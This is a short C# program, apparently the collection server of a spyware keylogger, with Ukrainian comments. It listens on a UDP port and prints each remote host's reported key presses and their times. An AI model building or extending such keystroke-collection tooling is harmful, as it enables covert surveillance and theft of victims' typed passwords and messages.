using Newtonsoft.Json;
using System;

namespace SpyWareServer
{
    class Program
    {
        static void Main(string[] args)
        {
            UDP_Server();
            Console.ReadLine();
        }
        private static void UDP_Server()
        {
            Console.WriteLine("Введіть локальний порт:");
            int locPort = Convert.ToInt32(Console.ReadLine());
            //Створюємо прослуховувач UDP пакетів на заданому порті
            ServerInstance serverInstance = new ServerInstance(locPort);
            serverInstance.UdpPacketRecievedEvent += (s, ipp) =>
            {
                var kstate = JsonConvert.DeserializeObject<KeyBoardInteractionInfo>(s);
                Console.WriteLine("З Адреси: " + ipp);
                Console.WriteLine("Клавіша: " + kstate.Key);
                Console.WriteLine("Значення: " + kstate.Value);
                Console.WriteLine("Час натискання: " + kstate.TimePressed);
            };
            serverInstance.Startlistener();
        }
    }
}
